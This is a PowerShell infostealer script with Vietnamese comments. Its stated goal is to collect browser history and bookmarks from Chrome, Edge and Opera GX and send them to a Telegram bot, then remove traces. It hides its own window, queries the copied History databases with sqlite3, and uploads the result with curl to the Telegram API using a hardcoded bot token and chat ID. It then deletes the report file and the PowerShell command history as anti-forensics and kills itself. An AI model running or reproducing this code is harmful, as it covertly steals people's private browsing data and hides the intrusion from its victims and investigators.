<#
    Kịch bản: Thu thập Lịch sử & Bookmarks Trình duyệt (Chrome, Edge, Opera)
    Mục tiêu: Gửi về Telegram Bot & Xóa dấu vết vật lý
#>
param(
    [string]$sqlitePath = "$env:TEMP\sqlite\sqlite3.exe",
    [string]$hide = 'y'
)

# 1. Cơ chế ẩn cửa sổ ngay lập tức
if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -MemberDefinition $a -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
    if($w -ne [System.IntPtr]::Zero){
        [void]$t::ShowWindowAsync($w,0)
    }
}

# 2. Thiết lập Telegram (Thông tin của Quân)
$Token   = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw"
$ChatID  = "8312702210"
$TeleURL = "https://api.telegram.org/bot$Token/sendDocument"
$outpath = "$env:TEMP\browser_history.txt"
$Regex   = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

# Khởi tạo file kết quả
"--- BROWSER REPORT | $(Get-Date -Format 'dd/MM/yyyy HH:mm') ---`n" | Out-File -FilePath $outpath -Encoding UTF8

# 3. Đường dẫn dữ liệu
$Paths = @{
    'chrome_h'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'chrome_b'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    'edge_h'    = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
    'edge_b'    = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    'opera_h'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    'opera_b'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
}

$Browsers = @('chrome', 'edge', 'opera')
$Types    = @('h', 'b')

# 4. Quá trình thu thập dữ liệu
foreach ($Browser in $Browsers) {
    foreach ($Type in $Types) {
        $Key = "${Browser}_${Type}"
        $Path = $Paths[$Key]

        if (Test-Path $Path) {
            try {
                if ($Type -eq 'h') {
                    # Copy file History sang Temp để tránh bị trình duyệt khóa
                    $copyPath = "$env:TEMP\${Browser}_temp_h"
                    Copy-Item $Path $copyPath -Force -ErrorAction SilentlyContinue
                    
                    if (Test-Path $sqlitePath) {
                        # Truy vấn 15 URL gần nhất bằng sqlite3.exe
                        $data = & $sqlitePath $copyPath "SELECT url FROM urls ORDER BY last_visit_time DESC LIMIT 15;"
                        $data | ForEach-Object { "$Browser [History] | $_" | Out-File $outpath -Append -Encoding UTF8 }
                    } else {
                        "$Browser [History] | (Loi: Thieu sqlite3.exe tai Temp)" | Out-File $outpath -Append -Encoding UTF8
                    }
                    Remove-Item $copyPath -Force -ErrorAction SilentlyContinue
                } else {
                    # Lọc Bookmarks bằng Regex
                    $Content = Get-Content -Path $Path -Raw -ErrorAction SilentlyContinue
                    $Matches = [regex]::Matches($Content, $Regex)
                    $Matches.Value | Sort-Object -Unique | ForEach-Object {
                        "$Browser [Bookmark] | $_" | Out-File $outpath -Append -Encoding UTF8
                    }
                }
            } catch { continue }
        }
    }
}

# 5. Gửi lên Telegram Bot và dọn dẹp dấu vết
if (Test-Path $outpath) {
    # Gửi file bằng curl (có sẵn trên Win 10/11)
    curl.exe -X POST $TeleURL -F "chat_id=$ChatID" -F "document=@$outpath" | Out-Null
    
    Start-Sleep -Seconds 2
    
    # Xóa file báo cáo
    Remove-Item $outpath -Force -ErrorAction SilentlyContinue
    
    # Xóa lịch sử lệnh PowerShell vừa gõ (Anti-Forensics)
    Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
}

# Thoát hoàn toàn tiến trình
Stop-Process -Id $PID -Force
